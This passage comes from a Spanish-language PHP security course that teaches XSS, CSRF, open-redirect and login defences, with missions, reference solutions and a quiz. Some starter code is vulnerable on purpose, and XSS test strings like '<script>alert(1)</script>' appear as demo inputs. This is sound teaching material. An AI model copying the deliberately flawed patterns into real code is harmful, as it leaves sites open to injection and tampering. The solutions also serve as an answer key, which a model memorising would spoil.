escapado, después se escapa dos veces (`&amp;lt;`) o se usa en otro lugar (un mail,
un PDF) con `&lt;` a la vista. Se guarda el dato **tal cual** y se escapa **al
mostrarlo**, según dónde se muestre.

**Troll: el token que no se revisa.** Poner el `<input type="hidden" name="csrf">` y
no compararlo al procesar no protege nada.

**Goblin: `rand()` para un token.** Es predecible. Para todo lo que sea secreto,
`random_bytes` o `random_int`.

**Ogro: confiar en un campo oculto.** `<input type="hidden" name="precio"
value="1000">` se cambia en dos segundos desde el navegador. Los datos que importan
se buscan en el servidor.

### Misión R03-N05-M1 · El libro de visitas blindado

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Este libro de visitas funciona… y tiene **cuatro** agujeros de seguridad. Copialo,
encontralos y corregilos, con un comentario en cada corrección:

1. muestra los mensajes sin escapar (XSS);
2. no tiene token CSRF;
3. el color del nombre llega por un campo `select` y se pone directo en un atributo
   `style` sin validar (inyección en el atributo);
4. después de guardar redirige a lo que diga `$_POST['volver']` (redirección
   abierta).

#### Criterio de aprobación

- Toda salida pasa por `htmlspecialchars`.
- El formulario tiene token CSRF y se verifica con `hash_equals`.
- El color se valida contra una lista y la redirección solo va a rutas internas.

#### Código inicial

```php
<?php
session_start();
$_SESSION['mensajes'] ??= [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['mensajes'][] = ['nombre' => $_POST['nombre'], 'color' => $_POST['color'], 'texto' => $_POST['texto']];
    header('Location: ' . $_POST['volver']);
    exit;
}
?>
<h1>Libro de visitas</h1>
<?php foreach ($_SESSION['mensajes'] as $m): ?>
    <p><b style="color: <?= $m['color'] ?>"><?= $m['nombre'] ?></b>: <?= $m['texto'] ?></p>
<?php endforeach; ?>
<form method="post">
    <input type="hidden" name="volver" value="/libro.php">
    <input name="nombre"> <select name="color"><option>azul</option><option>verde</option></select>
    <textarea name="texto"></textarea> <button>Firmar</button>
</form>
```

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 1 - El libro de visitas blindado: cuatro agujeros cerrados.
session_start();
const COLORES = ['azul', 'verde'];

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

$_SESSION['mensajes'] ??= [];
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 2. Token CSRF: sin él, otro sitio podría firmar en nombre del visitante.
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    // 3. El color se valida contra la lista: si no, se podía inyectar CSS o cerrar el atributo.
    $color = in_array($_POST['color'] ?? '', COLORES, true) ? $_POST['color'] : 'azul';
    $nombre = trim($_POST['nombre'] ?? '');
    $texto = trim($_POST['texto'] ?? '');
    if ($nombre !== '' && $texto !== '') {
        $_SESSION['mensajes'][] = ['nombre' => $nombre, 'color' => $color, 'texto' => $texto];
    }
    // 4. Solo se redirige a rutas internas (antes, a cualquier sitio).
    $volver = $_POST['volver'] ?? '';
    $volver = str_starts_with($volver, '/') && !str_starts_with($volver, '//') ? $volver : '/libro.php';
    header('Location: ' . $volver, true, 303);
    exit;
}
?>
<h1>Libro de visitas</h1>
<?php foreach ($_SESSION['mensajes'] as $m): ?>
    <?php // 1. Todo lo que escribió alguien se escapa al mostrarlo. ?>
    <p><b style="color: <?= $m['color'] === 'verde' ? 'green' : 'blue' ?>"><?= e($m['nombre']) ?></b>: <?= e($m['texto']) ?></p>
<?php endforeach; ?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input type="hidden" name="volver" value="/libro.php">
    <input name="nombre"> <select name="color"><option>azul</option><option>verde</option></select>
    <textarea name="texto"></textarea> <button>Firmar</button>
</form>
```

### Misión R03-N05-M2 · Las funciones de seguridad

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Armá un archivo `seguridad.php` con funciones reutilizables, y una página
`prueba.php` que las use para mostrar una tabla de "entrada → salida segura":

- `e(string $t): string` — escapa para HTML;
- `enlaceSeguro(string $url): string` — devuelve la dirección si empieza con
  `http://` o `https://`, y `#` si no (así `javascript:alert(1)` no se puede usar
  en un `href`);
- `csrfToken(): string` y `csrfCampo(): string` (el `<input type="hidden">` listo) y
  `csrfVerificar(): void` (responde 403 y corta si no coincide);
- `redirigirInterno(string $ruta, string $porDefecto = '/'): never` — redirige
  solo a rutas internas y termina.

`prueba.php` muestra, escapadas, las entradas peligrosas de ejemplo y el resultado
de `enlaceSeguro` para cada dirección, y tiene un formulario POST con `csrfCampo()`
que al enviarse muestra `Token correcto` (con `csrfVerificar()` antes).

#### Criterio de aprobación

- Las funciones están en un archivo aparte, incluido con `require_once __DIR__`.
- `enlaceSeguro` bloquea todo lo que no sea http o https.
- El POST sin token responde 403.

#### Solución de referencia

`seguridad.php`
```php
<?php
declare(strict_types=1);
// Funciones de seguridad reutilizables.

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function enlaceSeguro(string $url): string
{
    $url = trim($url);
    return preg_match('#^https?://#i', $url) ? $url : '#';
}

function csrfToken(): string
{
    return $_SESSION['csrf'] ??= bin2hex(random_bytes(32));
}

function csrfCampo(): string
{
    return '<input type="hidden" name="csrf" value="' . csrfToken() . '">';
}

function csrfVerificar(): void
{
    if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
}

function redirigirInterno(string $ruta, string $porDefecto = '/'): never
{
    $destino = str_starts_with($ruta, '/') && !str_starts_with($ruta, '//') ? $ruta : $porDefecto;
    header('Location: ' . $destino, true, 303);
    exit;
}
```

`prueba.php`
```php
<?php
declare(strict_types=1);
// Mision 2 - Las funciones de seguridad: una biblioteca propia y su prueba.
session_start();
require_once __DIR__ . '/seguridad.php';

$entradas = ['<script>alert(1)</script>', 'Ana "la Capitana"', "O'Higgins", 'A & B'];
$enlaces = ['https://puerto.com', 'javascript:alert(1)', 'http://ejemplo.org/a?b=1', '//otro-sitio.com', 'JaVaScRiPt:robar()'];
$enviado = false;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    csrfVerificar();
    $enviado = true;
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Seguridad</title></head>
<body>
    <h1>Entradas peligrosas</h1>
    <ul>
        <?php foreach ($entradas as $entrada): ?>
            <li><?= e($entrada) ?></li>
        <?php endforeach; ?>
    </ul>
    <h2>Enlaces</h2>
    <ul>
        <?php foreach ($enlaces as $url): ?>
            <li><?= e($url) ?> → <a href="<?= e(enlaceSeguro($url)) ?>"><?= e(enlaceSeguro($url)) ?></a></li>
        <?php endforeach; ?>
    </ul>
    <?php if ($enviado): ?><p>Token correcto</p><?php endif; ?>
    <form method="post"><?= csrfCampo() ?><button>Probar el token</button></form>
</body>
</html>
```

### Misión R03-N05-M3 · El precio que no se toca

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Esta tienda manda el **precio** en un campo oculto, y cualquiera lo puede cambiar
desde el navegador para comprar a $1. Reescribí `comprar.php` para que:

- el formulario mande solo el **código** del producto y la cantidad;
- el precio se busque en el servidor (una constante `PRODUCTOS`);
- se valide que el código exista y la cantidad sea un entero de 1 a 5;
- tenga token CSRF;
- muestre `Compraste N × PRODUCTO por $TOTAL.` o el error.

Si alguien manda un campo `precio` igual, se ignora.

#### Criterio de aprobación

- El precio nunca se toma de lo que manda el navegador.
- Valida el código, la cantidad y el token.

#### Código inicial

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $total = $_POST['precio'] * $_POST['cantidad'];
    echo "Compraste {$_POST['cantidad']} × {$_POST['producto']} por \$$total.";
    exit;
}
?>
<form method="post">
    <input type="hidden" name="producto" value="Mapa del puerto">
    <input type="hidden" name="precio" value="12500">
    <input type="number" name="cantidad" value="1"> <button>Comprar</button>
</form>
```

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 3 - El precio que no se toca: los datos que importan se buscan en el servidor.
session_start();
const PRODUCTOS = [
    'MAPA' => ['nombre' => 'Mapa del puerto', 'precio' => 12500],
    'BRUJ' => ['nombre' => 'Brújula', 'precio' => 18900],
];
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$mensaje = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $codigo = $_POST['codigo'] ?? '';
    $cantidad = filter_var($_POST['cantidad'] ?? '', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 5]]);
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        $mensaje = 'Pedido no válido.';
    } elseif (!isset(PRODUCTOS[$codigo])) {
        $mensaje = 'Ese producto no existe.';
    } elseif ($cantidad === false) {
        $mensaje = 'La cantidad va de 1 a 5.';
    } else {
        $producto = PRODUCTOS[$codigo];
        $mensaje = "Compraste $cantidad × {$producto['nombre']} por \$" . $producto['precio'] * $cantidad . '.';
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Tienda</title></head>
<body>
    <?php if ($mensaje !== null): ?><p><?= htmlspecialchars($mensaje) ?></p><?php endif; ?>
    <?php foreach (PRODUCTOS as $codigo => $p): ?>
        <form method="post">
            <?= htmlspecialchars($p['nombre']) ?> ($<?= $p['precio'] ?>)
            <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
            <input type="hidden" name="codigo" value="<?= $codigo ?>">
            <input type="number" name="cantidad" value="1" min="1" max="5">
            <button>Comprar</button>
        </form>
    <?php endforeach; ?>
</body>
</html>
```

### Encargo R03-N05-E1 · La auditoría del formulario de contacto

```meta
entrega: codigo
entorno: local
monedas: 1
xp: 15
```

#### Consigna

Una inmobiliaria tiene un formulario de contacto y te pide que lo dejes seguro.
Escribí `contacto.php` con nombre, email, teléfono (opcional), el **código de la
propiedad** que le interesa (de una lista de propiedades en una constante) y un
mensaje. Aplicá todo lo del nodo:

- token CSRF;
- validación de cada campo en el servidor (largos, email, propiedad existente);
- un campo "trampa" oculto para robots (`<input name="sitio_web" style="display:none">`):
  si viene con algo, se descarta el mensaje **en silencio** (se muestra el mismo
  "¡Gracias!" pero no se guarda);
- límite de **3 consultas por sesión** (contadas en `$_SESSION`): a la cuarta,
  responde 429 (`Too Many Requests`) con `Llegaste al límite de consultas.`;
- los mensajes aceptados se guardan en la sesión y se muestran abajo, escapados;
- PRG con mensaje flash.

#### Criterio de aprobación

- Tiene CSRF, validación, campo trampa y límite de consultas.
- Toda salida está escapada.
- Usa POST-Redirect-GET.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Encargo - La auditoría del formulario de contacto: todas las defensas juntas.
session_start();
const PROPIEDADES = ['C-101' => 'Casa en el Centro', 'D-204' => 'Depto frente al puerto', 'L-330' => 'Local en la costanera'];
const MAX_CONSULTAS = 3;

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$_SESSION['consultas'] ??= 0;
$_SESSION['recibidos'] ??= [];
$errores = [];
$d = ['nombre' => '', 'email' => '', 'telefono' => '', 'propiedad' => '', 'mensaje' => ''];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    if ($_SESSION['consultas'] >= MAX_CONSULTAS) {
        http_response_code(429);
        exit('Llegaste al límite de consultas.');
    }
    foreach (array_keys($d) as $campo) {
        $d[$campo] = trim((string) ($_POST[$campo] ?? ''));
    }
    if (mb_strlen($d['nombre']) < 2 || mb_strlen($d['nombre']) > 60) {
        $errores[] = 'El nombre va de 2 a 60 caracteres.';
    }
    if (filter_var($d['email'], FILTER_VALIDATE_EMAIL) === false) {
        $errores[] = 'El email no es válido.';
    }
    if ($d['telefono'] !== '' && !preg_match('/^[\d\s+-]{8,20}$/', $d['telefono'])) {
        $errores[] = 'El teléfono no es válido.';
    }
    if (!isset(PROPIEDADES[$d['propiedad']])) {
        $errores[] = 'Elegí una propiedad de la lista.';
    }
    if (mb_strlen($d['mensaje']) < 10 || mb_strlen($d['mensaje']) > 1000) {
        $errores[] = 'El mensaje va de 10 a 1000 caracteres.';
    }
    if ($errores === []) {
        $_SESSION['consultas']++;
        if (($_POST['sitio_web'] ?? '') === '') {           // la trampa quedó vacía: es una persona
            $_SESSION['recibidos'][] = $d;
        }
        $_SESSION['flash'] = '¡Gracias! Te respondemos a la brevedad.';
        header('Location: contacto.php', true, 303);
        exit;
    }
}
$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Contacto</title></head>
<body>
    <h1>Inmobiliaria El Faro</h1>
    <?php if ($flash !== null): ?><p><?= e($flash) ?></p><?php endif; ?>
    <?php foreach ($errores as $error): ?><p><strong><?= e($error) ?></strong></p><?php endforeach; ?>
    <form method="post">
        <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
        <input name="sitio_web" style="display:none" tabindex="-1" autocomplete="off">
        <input name="nombre" value="<?= e($d['nombre']) ?>" placeholder="Nombre">
        <input name="email" value="<?= e($d['email']) ?>" placeholder="Email">
        <input name="telefono" value="<?= e($d['telefono']) ?>" placeholder="Teléfono (opcional)">
        <select name="propiedad">
            <?php foreach (PROPIEDADES as $codigo => $nombre): ?>
                <option value="<?= $codigo ?>" <?= $d['propiedad'] === $codigo ? 'selected' : '' ?>><?= e($nombre) ?></option>
            <?php endforeach; ?>
        </select>
        <textarea name="mensaje"><?= e($d['mensaje']) ?></textarea>
        <button>Enviar</button>
    </form>
    <h2>Consultas recibidas (<?= count($_SESSION['recibidos']) ?>)</h2>
    <?php foreach ($_SESSION['recibidos'] as $r): ?>
        <p><?= e($r['nombre']) ?> sobre <?= e(PROPIEDADES[$r['propiedad']]) ?>: <?= e($r['mensaje']) ?></p>
    <?php endforeach; ?>
</body>
</html>
```

### Prueba del sello

#### ¿Qué es un ataque XSS y cómo se evita?

Es cuando una página muestra sin escapar algo que escribió otra persona y el navegador lo ejecuta como código. Se evita escapando toda salida con `htmlspecialchars`.

#### ¿Qué es un ataque CSRF?

Un pedido que otro sitio hace a tu sistema usando la sesión abierta del visitante, sin que él lo sepa.

#### ¿Cómo protege un token CSRF?

Es un valor secreto al azar guardado en la sesión y puesto en cada formulario; el otro sitio no lo conoce, así que su pedido falso no lo trae y se rechaza.

#### ¿Por qué no alcanza con validar en el navegador?

Porque el navegador lo controla el visitante: puede saltear o cambiar cualquier validación y mandar lo que quiera.

#### ¿Se escapa al guardar o al mostrar?

Al mostrar, según dónde se muestre. Se guarda el dato tal cual.

### Soluciones (docente)

Nodo nuevo, clave para la web. Para mostrar el XSS en clase sin riesgo, alcanza con `<b>hola</b>` o `<script>alert(1)</script>` en un campo de una copia sin escapar. En la misión 2, `never` como tipo de retorno (PHP 8.1) indica que la función nunca vuelve (siempre termina con `exit`).

## R03-N06 · Login con contraseñas

```meta
tipo: tema
padre: R03-N05
precio: 10
criatura: skeleton
temas: web.auth
usa: web.sesiones
```

### Crónica

La sala de archivos de la torre tiene una puerta con un guardia. Antes, el guardia tenía una lista con los nombres y las contraseñas de todos, escrita en un papel. Un día alguien se robó el papel, y con él, todas las contraseñas. Ahora el guardia tiene otra lista: al lado de cada nombre, un sello de lacre deformado que no se puede volver a convertir en la contraseña… pero que coincide si alguien dice la correcta.

—Las contraseñas **nunca** se guardan como las escribió la persona —dice {mentor}—. Se guarda su **huella**: un *hash*. Si te roban la lista, no sirve para entrar. Y cuando alguien entra, se le da una ficha nueva, {heroe}, por si alguien le había espiado la vieja.

### Objetivos

- Guardar contraseñas con `password_hash` y comprobarlas con `password_verify`.
- Armar un formulario de login que inicia sesión y otro que la cierra.
- Proteger páginas para que solo entren usuarios logueados.
- Cambiar el identificador de sesión al iniciar sesión (`session_regenerate_id`).
- Registrar usuarios nuevos con validación de la contraseña.
- Limitar los intentos fallidos.

### Antes de empezar

- Sesiones (R03-N04) y seguridad: CSRF y escapar (R03-N05).

### Explicación

#### Nunca en texto plano
Si guardás `ancla123` tal cual y te roban la base (pasa más de lo que parece), te
roban todas las contraseñas… que la gente usa también en su mail y en su banco. Se
guarda un **hash**: una "huella" de la contraseña que **no se puede revertir**.
```php
$hash = password_hash('ancla123', PASSWORD_DEFAULT);
// $2y$10$R7flf57cYzLAnMr14xX56OhKUJ5qlAco9VY/EbWmghiXoQB.vb5yS
password_verify('ancla123', $hash);   // true
password_verify('ancla124', $hash);   // false
```
- `password_hash` usa **bcrypt** con una **sal** al azar: la misma contraseña da un
  hash distinto cada vez (por eso no se compara con `===`: se usa `password_verify`).
- El hash tiene 60 caracteres hoy, pero puede crecer: en una base de datos se
  guarda en una columna de 255.
- **Nunca** uses `md5` ni `sha1` para contraseñas: son rapidísimos y se rompen por
  fuerza bruta. `password_hash` es lento a propósito.

#### El login
```php
session_start();
$usuarios = require __DIR__ . '/usuarios.php';   // usuario => hash

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = trim($_POST['usuario'] ?? '');
    $clave = $_POST['clave'] ?? '';
    $hash = $usuarios[$usuario]['hash'] ?? null;
    if ($hash !== null && password_verify($clave, $hash)) {
        session_regenerate_id(true);             // ficha nueva al entrar
        $_SESSION['usuario'] = $usuario;
        header('Location: panel.php', true, 303);
        exit;
    }
    $error = 'Usuario o contraseña incorrectos.';   // no decir cuál de los dos falló
}
```
- **`session_regenerate_id(true)`** cambia el identificador de la sesión al
  iniciar sesión: si alguien había conseguido la ficha vieja (*fijación de
  sesión*), ya no le sirve.
- El mensaje de error **no dice** si el usuario existe: así no se puede averiguar
  quién tiene cuenta.
- La contraseña **no se hace `trim`** (los espacios pueden ser parte de ella) y
  nunca se vuelve a mostrar en el formulario.

#### Páginas protegidas
Cada página privada empieza revisando la sesión:
```php
session_start();
if (!isset($_SESSION['usuario'])) {
    header('Location: login.php', true, 303);
    exit;
}
```
Conviene ponerlo en una función en un archivo aparte (`requerirLogin()`) y usarla
en todas las páginas privadas. Y si hay **roles** (admin, cliente), se revisa el rol
además de la sesión, en **cada** página: esconder el botón no alcanza.

#### Cerrar sesión
```php
session_start();
$_SESSION = [];
session_destroy();
header('Location: login.php', true, 303);
exit;
```
Se hace con un **POST** (un formulario con un botón y su token CSRF), para que un
enlace de otro sitio no pueda desloguear a nadie.

#### Registrarse
Al crear una cuenta:
- se valida el usuario (formato, que no exista) y la contraseña (largo mínimo: 8 o
  más; que no sea igual al usuario);
- se pide repetir la contraseña;
- se guarda `password_hash($clave, PASSWORD_DEFAULT)`.

#### Limitar los intentos
Para frenar a quien prueba miles de contraseñas, se cuentan los intentos fallidos
(en la sesión para empezar; en la base de datos y por usuario en un sistema real) y
se bloquea un rato después de varios.

### Código de ejemplo

`usuarios.php`
```php
<?php
// Usuarios de ejemplo: las contraseñas son ancla123, faro2026 y timon77.
return [
    'kira' => ['nombre' => 'Kira Valdez', 'rol' => 'admin', 'hash' => '$2y$10$R7flf57cYzLAnMr14xX56OhKUJ5qlAco9VY/EbWmghiXoQB.vb5yS'],
    'bron' => ['nombre' => 'Bron', 'rol' => 'cliente', 'hash' => '$2y$10$sY48d8IabcyzFGOVp12ZpuujEDnEgiSNQdtdVIB1rIGD4/BG9LYF6'],
    'lia' => ['nombre' => 'Lía', 'rol' => 'cliente', 'hash' => '$2y$10$RkUlc28FIys.6Idh51m8LuGuli1S.au.X3HuqdvuzElfhWtzOf6FO'],
];
```

`auth.php`
```php
<?php
declare(strict_types=1);
// Funciones de autenticación: se incluyen en cada página.
session_start();

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function csrf(): string
{
    return $_SESSION['csrf'] ??= bin2hex(random_bytes(32));
}

function csrfValido(): bool
{
    return hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '');
}

function usuarios(): array
{
    return require __DIR__ . '/usuarios.php';
}

function usuarioActual(): ?array
{
    $usuario = $_SESSION['usuario'] ?? null;
    return $usuario === null ? null : ['usuario' => $usuario] + usuarios()[$usuario];
}

function requerirLogin(?string $rol = null): array
{
    $actual = usuarioActual();
    if ($actual === null) {
        header('Location: login.php', true, 303);
        exit;
    }
    if ($rol !== null && $actual['rol'] !== $rol) {
        http_response_code(403);
        exit('No tenés permiso para ver esta página.');
    }
    return $actual;
}
```

`login.php`
```php
<?php
declare(strict_types=1);
/*
 * La puerta de la sala de archivos: login con password_verify y límite de intentos.
 */
require_once __DIR__ . '/auth.php';
const MAX_INTENTOS = 3;

$error = null;
$_SESSION['intentos'] ??= 0;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!csrfValido()) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    if ($_SESSION['intentos'] >= MAX_INTENTOS) {
        $error = 'Demasiados intentos. Probá más tarde.';
    } else {
        $usuario = mb_strtolower(trim($_POST['usuario'] ?? ''));
        $hash = usuarios()[$usuario]['hash'] ?? null;
        if ($hash !== null && password_verify($_POST['clave'] ?? '', $hash)) {
            session_regenerate_id(true);
            $_SESSION['usuario'] = $usuario;
            $_SESSION['intentos'] = 0;
            header('Location: panel.php', true, 303);
            exit;
        }
        $_SESSION['intentos']++;
        $error = 'Usuario o contraseña incorrectos.';
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Entrar</title></head>
<body>
    <h1>Sala de archivos</h1>
    <?php if ($error !== null): ?><p><strong><?= e($error) ?></strong></p><?php endif; ?>
    <form method="post">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input name="usuario" value="<?= e($_POST['usuario'] ?? '') ?>" placeholder="Usuario">
        <input type="password" name="clave" placeholder="Contraseña">
        <button>Entrar</button>
    </form>
</body>
</html>
```

`panel.php`
```php
<?php
declare(strict_types=1);
// Una página privada: solo para usuarios logueados.
require_once __DIR__ . '/auth.php';
$yo = requerirLogin();
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Panel</title></head>
<body>
    <h1>Hola, <?= e($yo['nombre']) ?></h1>
    <p>Tu rol: <?= e($yo['rol']) ?></p>
    <?php if ($yo['rol'] === 'admin'): ?>
        <p><a href="admin.php">Administrar archivos</a></p>
    <?php endif; ?>
    <form method="post" action="salir.php">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <button>Salir</button>
    </form>
</body>
</html>
```

`admin.php`
```php
<?php
declare(strict_types=1);
// Solo para el rol admin: se revisa en la página, no alcanza con esconder el enlace.
require_once __DIR__ . '/auth.php';
$yo = requerirLogin('admin');
?>
<p>Archivos secretos del Puerto. Bienvenida, <?= e($yo['nombre']) ?>.</p>
```

`salir.php`
```php
<?php
declare(strict_types=1);
require_once __DIR__ . '/auth.php';
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !csrfValido()) {
    http_response_code(405);
    exit('Para salir, usá el botón.');
}
$_SESSION = [];
session_destroy();
header('Location: login.php', true, 303);
exit;
```

### ¿Para qué sirve?

Casi todo sistema tiene usuarios: una tienda, un campus, un sistema de turnos, esta misma plataforma. Hacer bien el login (hashes, regenerar la sesión, no revelar qué falló, limitar intentos, revisar permisos en cada página) es lo que separa un sistema serio de uno que termina en las noticias por una filtración. Laravel trae todo esto armado, y ahora sabés qué hace por dentro.

### Errores habituales

**Troll: guardar la contraseña tal cual (o con `md5`).** Si te roban los datos, te
roban las contraseñas. Siempre `password_hash`.

**Ogro: comparar el hash con `===`.** `password_hash('x')` da un hash distinto cada
vez: `password_hash($clave) === $hashGuardado` es siempre falso. Se usa
`password_verify($clave, $hashGuardado)`.

**Troll: no regenerar la sesión.** Sin `session_regenerate_id(true)` al entrar, una
sesión robada antes del login sigue sirviendo después.

**Troll: proteger solo el enlace.** Esconder el botón de "Administrar" no alcanza:
quien escribe `admin.php` en la dirección entra si la página no revisa el rol.

**Ogro: el mensaje que revela.** "Ese usuario no existe" le confirma al atacante qué
usuarios sí existen. Decí siempre "usuario o contraseña incorrectos".

### Misión R03-N06-M1 · El registro de socios

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `registro.php` para crear cuentas, guardando los usuarios **en la sesión**
(`$_SESSION['cuentas']`, usuario → hash) para practicar sin base de datos. Validá:

- usuario: de 3 a 20 caracteres, solo letras minúsculas, números y guion bajo
  (`preg_match('/^[a-z0-9_]{3,20}$/')`), y que no exista;
- contraseña: al menos 8 caracteres, con al menos una letra y un número, y distinta
  del usuario;
- repetición: igual a la contraseña.

Si está todo bien, guardá `password_hash` (nunca la contraseña) y mostrá `Cuenta
creada: USUARIO.` y la cantidad de cuentas. El formulario conserva el usuario pero
**no** las contraseñas. Con token CSRF.

#### Criterio de aprobación

- Guarda solo el hash, con `password_hash`.
- Valida el formato del usuario, la fuerza de la contraseña y la repetición.
- No vuelve a mostrar las contraseñas en el formulario.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 1 - El registro de socios: validar y guardar solo el hash.
session_start();
$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$_SESSION['cuentas'] ??= [];
$errores = [];
$creada = null;
$usuario = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    $usuario = trim($_POST['usuario'] ?? '');
    $clave = $_POST['clave'] ?? '';
    $repetida = $_POST['repetida'] ?? '';

    if (!preg_match('/^[a-z0-9_]{3,20}$/', $usuario)) {
        $errores[] = 'El usuario va de 3 a 20 caracteres: minúsculas, números y _.';
    } elseif (isset($_SESSION['cuentas'][$usuario])) {
        $errores[] = 'Ese usuario ya existe.';
    }
    if (strlen($clave) < 8 || !preg_match('/[a-zA-Z]/', $clave) || !preg_match('/\d/', $clave)) {
        $errores[] = 'La contraseña necesita 8 caracteres o más, con letras y números.';
    } elseif ($clave === $usuario) {
        $errores[] = 'La contraseña no puede ser igual al usuario.';
    }
    if ($clave !== $repetida) {
        $errores[] = 'Las contraseñas no coinciden.';
    }
    if ($errores === []) {
        $_SESSION['cuentas'][$usuario] = password_hash($clave, PASSWORD_DEFAULT);
        $creada = $usuario;
        $usuario = '';
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Registro</title></head>
<body>
    <h1>Hacete socio</h1>
    <?php if ($creada !== null): ?>
        <p>Cuenta creada: <?= htmlspecialchars($creada) ?>. Socios: <?= count($_SESSION['cuentas']) ?>.</p>
    <?php endif; ?>
    <?php foreach ($errores as $e): ?><p><strong><?= $e ?></strong></p><?php endforeach; ?>
    <form method="post">
        <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
        <input name="usuario" value="<?= htmlspecialchars($usuario) ?>" placeholder="usuario">
        <input type="password" name="clave" placeholder="contraseña">
        <input type="password" name="repetida" placeholder="repetí la contraseña">
        <button>Crear cuenta</button>
    </form>
</body>
</html>
```

### Misión R03-N06-M2 · El área de socios

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 4
xp: 10
```

#### Consigna

Armá un sitio chico con login, a partir del ejemplo del nodo:

- `usuarios.php` con tres usuarios (hashes generados con `password_hash`: armá un
  archivo `generar.php` que los imprima y copialos), con rol `socio` o `tesorero`;
- `login.php`, `salir.php` (POST con CSRF) y un `auth.php` con `requerirLogin()`;
- `socios.php` — para cualquier usuario logueado: `Hola, NOMBRE` y la lista de
  actividades del club;
- `tesoreria.php` — **solo** para el rol `tesorero` (los demás reciben 403): muestra
  la recaudación del mes;
- en `socios.php`, el enlace a tesorería aparece solo para el tesorero.

Probá entrar con cada usuario, escribir `tesoreria.php` a mano con un socio, y
salir.

#### Criterio de aprobación

- Las contraseñas se comprueban con `password_verify` y se regenera la sesión al entrar.
- Las páginas privadas usan `requerirLogin()`, y tesorería revisa el rol.
- Salir es un POST con CSRF.

#### Solución de referencia

`usuarios.php`
```php
<?php
// Contraseñas: ancla123 (ana), faro2026 (beto), timon77 (caro).
return [
    'ana' => ['nombre' => 'Ana Pérez', 'rol' => 'tesorero', 'hash' => '$2y$10$R7flf57cYzLAnMr14xX56OhKUJ5qlAco9VY/EbWmghiXoQB.vb5yS'],
    'beto' => ['nombre' => 'Beto Díaz', 'rol' => 'socio', 'hash' => '$2y$10$sY48d8IabcyzFGOVp12ZpuujEDnEgiSNQdtdVIB1rIGD4/BG9LYF6'],
    'caro' => ['nombre' => 'Caro Ríos', 'rol' => 'socio', 'hash' => '$2y$10$RkUlc28FIys.6Idh51m8LuGuli1S.au.X3HuqdvuzElfhWtzOf6FO'],
];
```

`auth.php`
```php
<?php
declare(strict_types=1);
session_start();

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function csrf(): string
{
    return $_SESSION['csrf'] ??= bin2hex(random_bytes(32));
}

function csrfValido(): bool
{
    return hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '');
}

function requerirLogin(?string $rol = null): array
{
    $usuarios = require __DIR__ . '/usuarios.php';
    $clave = $_SESSION['usuario'] ?? null;
    if ($clave === null || !isset($usuarios[$clave])) {
        header('Location: login.php', true, 303);
        exit;
    }
    $yo = $usuarios[$clave];
    if ($rol !== null && $yo['rol'] !== $rol) {
        http_response_code(403);
        exit('Solo para ' . $rol . '.');
    }
    return $yo;
}
```

`login.php`
```php
<?php
declare(strict_types=1);
require_once __DIR__ . '/auth.php';
$error = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!csrfValido()) {
